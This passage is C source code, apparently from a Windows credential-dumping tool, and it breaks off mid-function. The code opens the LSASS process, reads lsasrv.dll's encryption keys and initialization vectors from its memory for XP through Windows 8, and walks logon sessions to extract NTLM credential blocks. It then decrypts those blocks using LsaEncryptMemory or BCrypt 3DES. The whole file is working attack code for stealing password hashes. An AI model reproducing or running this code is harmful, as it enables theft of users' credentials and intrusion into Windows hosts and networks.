#include "core.h"

HANDLE hLsass = INVALID_HANDLE_VALUE;	// handle of LSASS process
ADDRESSES symbAddr;						// structure with all symbols addresses
OSVERSIONINFO osvi;						// structure containing OS Version
DWORD_PTR dllBaseAddr;					// Base address in memory of lsasrv.dll
DWORD_PTR WdigestDllBaseAddr;			// Base address in memory of wdigest.dll
int cbSessionEntry = 0;				// size of struct SESSION_ENTRY (change according OS version)

// Variables that are read in LSASS memory
ULONG LogonSessionListCount;			// Number of logon session lists that we can find in memory
LONG_PTR LogonSessionList = NULL;		// struct _LIST_ENTRY *LogonSessionList
										// Used to access the credentials

// Variables used before Windows Vista SP1
BYTE g_Feedback[8];						// unsigned __int64 g_Feedback
LPVOID g_pDESXKey = NULL;				// struct _desxtable *g_pDESXKey
BYTE g_DESXKey[400];

// Variables used since Windows Vista SP1
BYTE initializationVector[16];
LPVOID h3DesKey = NULL;
LPVOID hAesKey = NULL;
struct _BCRYPT_KEY_HANDLE hBcrypt3DesKey;
struct _MSCRYPT_KEY_HANDLE hMscrypt3DesKey;	// not used for Windows version > NT6.2

// Varible used since NT 6.2 (Windows 8 and Server 2012)
struct _MSCRYPT_KEY_HANDLE_NT62 hMscrypt3DesKeyNT62;


DWORD_PTR GetDllBaseAddr(DWORD dwPid, LPBYTE DllName){
	// Get Base Address of a DLL in a specific process defined by its PID
	MODULEENTRY32 m;
	HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
	LPBYTE buffer = NULL;

	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(BYTE));

	// take snapshot of modules of a process
	hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
	if (hModuleSnap == INVALID_HANDLE_VALUE){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] CreateToolhelp32Snapshot(): %d\n"), GetLastError());
		OutputDebugString(buffer);
		return 0;
	}

	m.dwSize = sizeof(MODULEENTRY32);

	if (!Module32First(hModuleSnap, &m)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Module32First(): %d\n"), GetLastError());
		OutputDebugString(buffer);
		if (buffer) free(buffer); buffer = NULL;
		CloseHandle(hModuleSnap);
		return 0;
	}

	do {
		if ((_tcsicmp(m.szModule, DllName) == 0)){
			// case insensitive because it can be "lsasrv.dll", "LSASRV.dll" 
			CloseHandle(hModuleSnap);
			if (buffer) free(buffer); buffer = NULL;
			return m.modBaseAddr;
		}
	} while (Module32Next(hModuleSnap, &m));
	
	if (buffer) free(buffer); buffer = NULL;
	CloseHandle(hModuleSnap);
	return 0;
}

BOOL GetPidByName(LPCTSTR lpszProcessName, LPDWORD lpPid){
	// Look for PID of a process name
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	LPBYTE buffer = NULL;

	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(BYTE));

	// Take snapshot of running processes
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] CreateToolhelp32Snapshot(): %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}
	
	// Set the size of the structure before using it
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Get info from the first process of the snapshot
	if (!Process32First(hProcessSnap, &pe32)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Module32First(): %d\n"), GetLastError());
		OutputDebugString(buffer);
		CloseHandle(hProcessSnap);
		if (buffer) free(buffer); buffer = NULL;
		return FALSE;
	}
	
	do{	
		if (_tcscmp(pe32.szExeFile, lpszProcessName) == 0){
			// compare process name with the process looking for
			*lpPid = pe32.th32ProcessID;
			if (buffer) free(buffer); buffer = NULL;
			CloseHandle(hProcessSnap);
			return TRUE;
		}
	} while(Process32Next(hProcessSnap, &pe32));

	if (buffer) free(buffer); buffer = NULL;
	CloseHandle(hProcessSnap);
	return FALSE;
}

BOOL OpenLsass(){
	// Create a Handle for LSASS process
	LPBYTE buffer = NULL;
	DWORD dwPid;
	BOOL res;

	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(BYTE));
	res = GetPidByName(_T("lsass.exe"), &dwPid);

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("LSASS.EXE PID : %d \n"), dwPid);
	OutputDebugString(buffer);
	if (res){
		//PROCESS_QUERY_INFORMATION used to call GetProcessId() on Xp and 2003 systems
		hLsass = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPid);

		if (hLsass != NULL){
			dllBaseAddr = GetDllBaseAddr(dwPid, _T("lsasrv.dll"));
			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("DLL Base addr %p\n"), dllBaseAddr);
			OutputDebugString(buffer);
			return TRUE;
		} else {
			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call OpenProcess(): %d\n\t You maybe missed to get SYSTEM rights\n"), GetLastError());
			OutputDebugString(buffer);
		}
	}
	if (buffer) free(buffer); buffer = NULL;
	return FALSE;
}

BOOL CloseLsass(){
	// Close LSASS Handle
	if (hLsass) {
		if (CloseHandle(hLsass) != 0){
			return TRUE;
		}
	}
	return FALSE;
}

BOOL GetDataInMemory(VOID){
	// Get decrypt and session informations from memory
	LPBYTE buffer = NULL;
	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(BYTE));
	
	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasv.dll?LogonSessionListCount : %p\n"), (dllBaseAddr + symbAddr.LogonSessionListCountAddr));
	OutputDebugString(buffer);
	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasv.dll?LogonSessionList : %p\n"), (dllBaseAddr + symbAddr.LogonSessionListAddr));
	OutputDebugString(buffer);


	// Get number of logonsession in list
	if (!ReadProcessMemory(hLsass, (LPCVOID) (dllBaseAddr + symbAddr.LogonSessionListCountAddr), &LogonSessionListCount, sizeof(LogonSessionListCount), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read LogonSessionListCount: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}	
	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Session List Count : %d\n"), LogonSessionListCount);
	OutputDebugString(buffer);

	// Get OS version
	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (!GetVersionEx(&osvi)){
		return FALSE;
	}

	// At least NT 5.1 (XP/2003)
	if (osvi.dwMajorVersion <= 5 && osvi.dwMinorVersion < 1){
		return FALSE;
	}

	// OS < Vista SP1
	if ((osvi.dwMajorVersion < 6) || (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0 && (_tcscmp(osvi.szCSDVersion, _T("")) == 0))){
		GetDataInXPMemory();
	} else{	// OS > Vista SP1
		GetDataInPostVistaMemory();
	}
	if (buffer) free(buffer); buffer = NULL;
	return TRUE;
}


BOOL GetDataInXPMemory(VOID){
	// Get decrypt information from memory for system older than Vista SP1
	LPBYTE buffer = NULL, tmp = NULL;
	int i = 0;
	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(BYTE));
	tmp = calloc(SMALL_BUFFER_SIZE, sizeof(BYTE));

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasrv.dll?g_Feedback : %p\n"), (dllBaseAddr + symbAddr.FeedbackAddr));
	OutputDebugString(buffer);

	// read g_Feedback from LSASS memory
	if (!ReadProcessMemory(hLsass, (LPCVOID) (dllBaseAddr + symbAddr.FeedbackAddr), &g_Feedback, sizeof(g_Feedback), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read g_Feedback: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}
	
	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("g_Feedback: "));
	for (i = 0 ; i<sizeof(g_Feedback) ; i++){
		_sntprintf_s(tmp, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%.2x "), g_Feedback[i]);
		_tcscat_s(buffer, LARGE_BUFFER_SIZE, tmp);
	}
	OutputDebugString(buffer);
	OutputDebugString(_T("\n"));

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasrv.dll?g_pDESXKey: %p\n"), (dllBaseAddr + symbAddr.PDesxKeyAddr));
	OutputDebugString(buffer);

	// read DESX Key pointer address from LSASS memory
	if (!ReadProcessMemory(hLsass, (LPCVOID) (dllBaseAddr + symbAddr.PDesxKeyAddr), &g_pDESXKey, sizeof(LONG_PTR), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read g_pDESXKey: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	// read datas from DES X Key in LSASS Memory
	if(!ReadProcessMemory(hLsass, (LPCVOID) g_pDESXKey, &g_DESXKey, sizeof(g_DESXKey), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read g_pDESXKey: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("g_pDESXKey: "));
	for (i = 0 ; i<sizeof(g_DESXKey) ; i++){
		_sntprintf_s(tmp, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%.2x "), g_DESXKey[i]);
		_tcscat(buffer, tmp);
	}
	OutputDebugString(buffer);
	OutputDebugString(_T("\n"));

	if (buffer) free(buffer); buffer = NULL;
	if (tmp) free(tmp); tmp = NULL;
	return TRUE;
}

BOOL GetDataInPostVistaMemory(VOID){
	// Get decrypt information from post Vista SP1 memory
	LPBYTE buffer = NULL;
	LPBYTE tmp = NULL;
	int i = 0;

	buffer = calloc(LARGE_BUFFER_SIZE, sizeof(BYTE));
	tmp = calloc(SMALL_BUFFER_SIZE, sizeof(BYTE));

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasrv.dll?InitializationVector: %p\n"), (dllBaseAddr + symbAddr.IVAddr));
	OutputDebugString(buffer);

	// read initializationvector from LSASS memory
	if(!ReadProcessMemory(hLsass, (LPCVOID) (dllBaseAddr + symbAddr.IVAddr), &initializationVector, sizeof(initializationVector), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read initializationVector: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Initialization Vector: "));
	for (i = 0 ; i<sizeof(initializationVector) ; i++){
		_sntprintf_s(tmp, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%.2xh "), initializationVector[i]);
		_tcscat_s(buffer, LARGE_BUFFER_SIZE, tmp);
	}
	OutputDebugString(buffer);
	OutputDebugString(_T("\n"));

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasrv.dll?h3DesKey: %p\n"), (dllBaseAddr + symbAddr.H3DesKeyAddr));
	OutputDebugString(buffer);

	// read pointer of h3DesKey in LSASS memory
	if (!ReadProcessMemory(hLsass, (LPCVOID) (dllBaseAddr + symbAddr.H3DesKeyAddr), &h3DesKey, sizeof(LONG_PTR), NULL)) {
		return FALSE;
	}

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("BCRYPT_KEY_HANDLE structure address: %p\n"), (h3DesKey));
	OutputDebugString(buffer);	
	
	// read BCRYPT_KEY_HANDLE structure for 3DESKey in LSASS memory
	if (!ReadProcessMemory(hLsass, (LPCVOID) h3DesKey, &hBcrypt3DesKey, sizeof(hBcrypt3DesKey), NULL)){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read BCRYPT_KEY_HANDLE: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("3DesKey addr (BCRYPT_KEY_HANDLE.hkey): %p\n"), (hBcrypt3DesKey.hKey));
	OutputDebugString(buffer);

	// read MSCRYPT_KEY_HANDLE structure from LSASS memory
	if (osvi.dwMajorVersion <= 6 && osvi.dwMinorVersion < 2){
		// Before Windows 8/2012
		if(!ReadProcessMemory(hLsass, (LPCVOID) hBcrypt3DesKey.hKey, &hMscrypt3DesKey, sizeof(hMscrypt3DesKey), NULL)){
			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read MSCRYPT_KEY_HANDLE: %d\n"), GetLastError());
			OutputDebugString(buffer);
			return FALSE;
		}

		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("3DES KEY: "));
		for (i = 0 ; i<sizeof(hMscrypt3DesKey.pbSecret) ; i++){
			_sntprintf_s(tmp, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%.2xh "), hMscrypt3DesKey.pbSecret[i]);
			_tcscat_s(buffer, LARGE_BUFFER_SIZE, tmp);
		}
		OutputDebugString(buffer);
		OutputDebugString(_T("\n"));

	} else {
		// Since Windows 8/2012
		if(!ReadProcessMemory(hLsass, (LPCVOID) hBcrypt3DesKey.hKey, &hMscrypt3DesKeyNT62, sizeof(hMscrypt3DesKeyNT62), NULL)){
			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read MSCRYPT_KEY_HANDLE: %d\n"), GetLastError());
			OutputDebugString(buffer);
			return FALSE;
		}

		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("3DES KEY: "));
		for (i = 0 ; i<sizeof(hMscrypt3DesKeyNT62.pbSecret) ; i++){
			_sntprintf_s(tmp, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%.2xh "), hMscrypt3DesKeyNT62.pbSecret[i]);
			_tcscat_s(buffer, LARGE_BUFFER_SIZE, tmp);
		}
		OutputDebugString(buffer);
		OutputDebugString(_T("\n"));

	}

	if (tmp) free(tmp); tmp = NULL;
	if (buffer) free(buffer); buffer = NULL;
	return TRUE;
}

int GetHashes(PCREDS_INFOS aCredsInfos){
	// Get the structure containing the hashes
	unsigned long i = 0, s = 0;
	int idx_session = -1;
	LONG_PTR lpHashes;
	HANDLE hHeap = NULL;
	PSESSION_ENTRY lpSessionEntry = NULL;
	PCREDS_ENTRY lpCredsEntry = NULL;
	PCREDS_HASH_ENTRY lpCredsHashEntry = NULL;
	LPBYTE lpNtlmCredsBlock = NULL;
	LPBYTE buffer = NULL, tmp = NULL;

	hHeap = HeapCreate(0, 0, 0);	

	#if defined _WIN64
	/*
	64 bits
	sizeof(SESSION_ENTRY)
		XP : 344 bytes
		Vista : 560 bytes
		Seven : 568 bytes
	*/
	if (osvi.dwMajorVersion < 6){
		// Before NT6.0
		cbSessionEntry = 344;
	} else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0){
		// NT6.0
		cbSessionEntry = 560;
	} else{
		// Since NT6.1
		cbSessionEntry = 568;
	}
	#else
	/*
	32 bits
	sizeof(SESSION_ENTRY)
		XP : 192 bytes
		Vista & Seven : 352 bytes
	*/
	if (osvi.dwMajorVersion < 6){
		// Before NT6.0
		cbSessionEntry = 192;
	} else {
		// Since NT6.0
		cbSessionEntry = 352;
	}
	#endif

	lpSessionEntry = (PSESSION_ENTRY) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, (sizeof(BYTE) * cbSessionEntry));
	lpCredsEntry = (PCREDS_ENTRY) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(CREDS_ENTRY));
	lpCredsHashEntry = (PCREDS_HASH_ENTRY) HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(CREDS_HASH_ENTRY));
	buffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(BYTE));

	tmp = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, SMALL_BUFFER_SIZE * sizeof(BYTE));

	for (s = 0 ; s < LogonSessionListCount; s++){
		if (!ReadProcessMemory(hLsass, (LPCVOID) ((dllBaseAddr + symbAddr.LogonSessionListAddr)+(s*2*sizeof(DWORD_PTR))),
			&LogonSessionList, sizeof(LogonSessionList), NULL)){
				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read LogonSessionList: %d\n"), GetLastError());
				OutputDebugString(buffer);
			return idx_session;
		}
	
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("SessionListAddr(%d): %ph\n"), s, ((dllBaseAddr + symbAddr.LogonSessionListAddr)+(s*2*sizeof(DWORD_PTR))));
		OutputDebugString(buffer);
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Address of the first session of the list: %ph\n"), LogonSessionList);
		OutputDebugString(buffer);
		
		do{
			//
			// SESSION_ENTRY
			//
			if (osvi.dwMajorVersion < 6){
				// get SESSION_ENTRY
				if (!ReadProcessMemory(hLsass, (LPCVOID) (LogonSessionList), lpSessionEntry, sizeof(SESSION_ENTRY), NULL)){
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read SessionEntry: %d\n"), GetLastError());
					OutputDebugString(buffer);
					return idx_session;
				}

				// set pointer to CREDS_ENTRY structure from memory
				lpHashes = (LONG_PTR) lpSessionEntry->CredsEntry;
			} else{
				
				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("LogonSessionList value: %ph\n"), LogonSessionList);
				OutputDebugString(buffer);

				// Since Vista, offset to CredsEntry in SESSION_ENTRY structure has changed
				if (!ReadProcessMemory(hLsass, (LPCVOID) LogonSessionList, lpSessionEntry, (cbSessionEntry*sizeof(BYTE)), NULL)){
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read SessionEntry: %d\n"), GetLastError());
					OutputDebugString(buffer);
					return idx_session;
				}

				#if defined _WIN64
					if (osvi.dwMajorVersion <= 6 && osvi.dwMinorVersion < 2){
						lpHashes = (LONG_PTR) *(&lpSessionEntry->CredsEntry+13);
					} else {
						lpHashes = (LONG_PTR) *(&lpSessionEntry->CredsEntry+17);
					}
				#else
					if (osvi.dwMajorVersion <= 6 && osvi.dwMinorVersion < 2){
						lpHashes = (LONG_PTR) *(&lpSessionEntry->CredsEntry+16);
					} else {
						lpHashes = (LONG_PTR) *(&lpSessionEntry->CredsEntry+18);
					}
				#endif
			}

			_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("lpSessionEntry->CredsEntry[+off]: %ph\n"), lpHashes);
			OutputDebugString(buffer);

			//
			// CREDS_ENTRY
			//
			
			if (lpHashes){
				// get CREDS_ENTRY structure from memory
				if (!ReadProcessMemory(hLsass, (LPCVOID) lpHashes, (LPVOID) lpCredsEntry, sizeof(CREDS_ENTRY), NULL)){
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read CREDS_ENTRY: %d\n"), GetLastError());
					OutputDebugString(buffer);
					return idx_session;
				}

				_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("lpCredsEntry->CredsHashEntry: %ph\n"), lpCredsEntry->CredsHashEntry);
				OutputDebugString(buffer);
								
				//
				// CREDS_HASH_ENTRY
				//
				
				if (lpCredsEntry->CredsHashEntry){
					if (!ReadProcessMemory(hLsass, (LPCVOID) lpCredsEntry->CredsHashEntry, (LPVOID) lpCredsHashEntry, sizeof(CREDS_HASH_ENTRY), NULL)){
						_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read CREDS_HASH_ENTRY: %d\n"), GetLastError());
						OutputDebugString(buffer);
						return idx_session;
					}

					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("CredsHashEntry->HashBuffer: %ph\n"), lpCredsHashEntry->HashBuffer);
					OutputDebugString(buffer);
					_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("CredsHashEntry->HashLength: %x\n"), lpCredsHashEntry->HashLength);
					OutputDebugString(buffer);

					//
					// NTLM_CREDS_BLOCK
					//
					
					lpNtlmCredsBlock = (LPBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, lpCredsHashEntry->HashLength * sizeof(BYTE));
					if (lpCredsHashEntry->HashBuffer){
						if(!ReadProcessMemory(hLsass, (LPCVOID) lpCredsHashEntry->HashBuffer, (LPVOID) lpNtlmCredsBlock, lpCredsHashEntry->HashLength, NULL)){
							_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to read CredsHashEntry->HashBuffer: %d\n"), GetLastError());
							OutputDebugString(buffer);
							return idx_session;
						}
						_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("lpNtlmCredsBlock: %ph\n"), (lpNtlmCredsBlock));
						OutputDebugString(buffer);
						
						_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("NTLM CREDS BLOCK : \n"));
						for (i = 0 ; i<lpCredsHashEntry->HashLength ; i++){
							_sntprintf_s(tmp, SMALL_BUFFER_SIZE, _TRUNCATE, _T("%.2xh "), lpNtlmCredsBlock[i]);
							_tcscat_s(buffer, LARGE_BUFFER_SIZE, tmp);
						}
						OutputDebugString(buffer);
						OutputDebugString(_T("\n"));

						idx_session++;
						DecryptHashes(lpNtlmCredsBlock, lpCredsHashEntry->HashLength, aCredsInfos, idx_session);
					}
				}
			}
		
			LogonSessionList = (LONG_PTR) lpSessionEntry->NextEntry;
			OutputDebugString(_T("------\n"));
		} while(LogonSessionList != ((LONG_PTR) ( (dllBaseAddr + symbAddr.LogonSessionListAddr)+(s*2*sizeof(DWORD_PTR)))));
	}
	
	if (tmp) HeapFree(hHeap, 0, tmp);   tmp = NULL;
	if (buffer) HeapFree(hHeap, 0, buffer);   buffer = NULL;
	if (lpCredsEntry) HeapFree(hHeap, 0, lpCredsEntry); lpCredsEntry = NULL;
	if (lpCredsHashEntry) HeapFree(hHeap, 0, lpCredsHashEntry); lpCredsHashEntry = NULL;
	if (lpSessionEntry) HeapFree(hHeap, 0, lpSessionEntry); lpSessionEntry = NULL;
	if (lpNtlmCredsBlock) HeapFree(hHeap, 0, lpNtlmCredsBlock); lpNtlmCredsBlock = NULL;
	if (hHeap) HeapDestroy(hHeap);
	return idx_session;
}


BOOL LsaInitAndDecrypt(LPTSTR lpBuffer, size_t cbBuffer){
	HMODULE hBaseAddr = INVALID_HANDLE_VALUE;
	LPBYTE buffer = NULL;

	LsaEncryptMemoryFunction LsaEncryptMemory = (LsaEncryptMemoryFunction) (dllBaseAddr + symbAddr.LsaEncryptMemoryAddr);

	buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(BYTE));

	_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("Lsasrv.dll?LsaEncryptMemory: %ph\n"), LsaEncryptMemory);
	OutputDebugString(buffer);

	// mandatory, because we need lsasrv.dll to be loaded to use LsaEncryptMemory()
	hBaseAddr = LoadLibrary(_T("lsasrv.dll"));
	if (!hBaseAddr){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to load Lsasrv.dll: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	if ((osvi.dwMajorVersion < 6) || (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0 && (_tcscmp(osvi.szCSDVersion, _T("")) == 0))){
		// Copy the initialization vector in memory
		memcpy((LPVOID) (dllBaseAddr + symbAddr.FeedbackAddr), g_Feedback, sizeof(g_Feedback));

		// Replace the address of the "key" to our own, extracted from LSASS
		*((LPBYTE *) (dllBaseAddr + symbAddr.PDesxKeyAddr)) = (LPBYTE) &g_DESXKey;
	
		LsaEncryptMemory(lpBuffer, cbBuffer, 0);
	}

	if (hBaseAddr) FreeLibrary(hBaseAddr);
	if (buffer) HeapFree(GetProcessHeap(), 0, buffer); buffer = NULL;
	return TRUE;
}

BOOL BcryptInitAndDecrypt(LPTSTR lpInput, size_t cbInput, LPTSTR lpOutput){
	HMODULE hBcryptDll = INVALID_HANDLE_VALUE;
	BCRYPT_HANDLE h3desProvider = NULL;
	BCRYPT_KEY_HANDLE h3desKey = NULL;
	ULONG objLen = 0, blockLen = 0, nbRead = 0, plainTextSize = 0; 
	LPBYTE lpKeyObj = NULL, lpIV = NULL, buffer = NULL, tmp = NULL;
	NTSTATUS res = 0;

	// Structure where the 3DES Key will be copy in order to be able to import
	typedef struct _KEYBLOB {
		BCRYPT_KEY_DATA_BLOB_HEADER header;
		UCHAR key[24];	// Key buffer
	} KEYBLOB;

	KEYBLOB keyblob;
	keyblob.header.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
	keyblob.header.dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
	keyblob.header.cbKeyData = 24;

	buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, LARGE_BUFFER_SIZE * sizeof(BYTE));
	tmp = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SMALL_BUFFER_SIZE * sizeof(BYTE));

	hBcryptDll = LoadLibrary(_T("bcrypt.dll"));
	if (!hBcryptDll){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to load Bcrypt.dll: %d\n"), GetLastError());
		OutputDebugString(buffer);
		return FALSE;
	}

	// Open a 3DES Algorithm Provider
	res = BCryptOpenAlgorithmProvider(&h3desProvider, BCRYPT_3DES_ALGORITHM, 0, 0);
	if (res){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BCryptOpenAlgorithmProvider():\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	// Get Length of 3DES Key 
	res = BCryptGetProperty(h3desProvider, BCRYPT_OBJECT_LENGTH, (PBYTE) &objLen, sizeof(ULONG), &nbRead, 0);
	if(res){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BCryptGetProperty(BCRYPT_OBJECT_LENGTH):\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	// Get Length of 3DES IV
	res = BCryptGetProperty(h3desProvider, BCRYPT_BLOCK_LENGTH, (PBYTE) &blockLen, sizeof(ULONG), &nbRead, 0);
	if (res){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BCryptGetProperty(BCRYPT_BLOCK_LENGTH):\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	// Allocate buffers for Key and IV
	lpKeyObj = (LPBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objLen);
	lpIV = (LPBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, blockLen);

	// Set CBC mode 
	res = BCryptSetProperty(h3desProvider, BCRYPT_CHAINING_MODE, (PBYTE) BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (res){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BCryptSetProperty(BCRYPT_CHAINING_MODE):\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	// copy from different structure depending on Windows version
	if (osvi.dwMajorVersion <= 6 && osvi.dwMinorVersion < 2){
		memcpy(keyblob.key, hMscrypt3DesKey.pbSecret, sizeof(keyblob.key));
	} else {
		memcpy(keyblob.key, hMscrypt3DesKeyNT62.pbSecret, sizeof(keyblob.key));
	}

	// Import LSASS Key from memory in BCRYPT initialized environnement
	res = BCryptImportKey(h3desProvider, NULL, BCRYPT_KEY_DATA_BLOB, &h3desKey, lpKeyObj, objLen, (PUCHAR) &keyblob, sizeof(keyblob), 0);
	if (res){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BCryptImportKey():\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	// copy extracted IV from LSASS memory in Bcrypt structures
	memcpy(lpIV, initializationVector, 8 * sizeof(BYTE));
	
	// calcul size of the cipher text
	res = BCryptDecrypt(h3desKey, lpInput, cbInput, 0, lpIV, 8, 0, 0, &plainTextSize, 0);
	if (res){
		_sntprintf_s(buffer, LARGE_BUFFER_SIZE, _TRUNCATE, _T("[ERROR] Fail to call BcryptDecrypt() to calcul plainTextSize:\n\t Return Value: %.8x\n"), res);
		OutputDebugString(buffer);
		return FALSE;
	}

	// Decryption of the buffer
	res = BCryptDecrypt(h3desKey, lpInput, cbInput, 0, lpIV, 8, lpOutput, plainTextSize, &plainTextSize, 0);
	if (res){
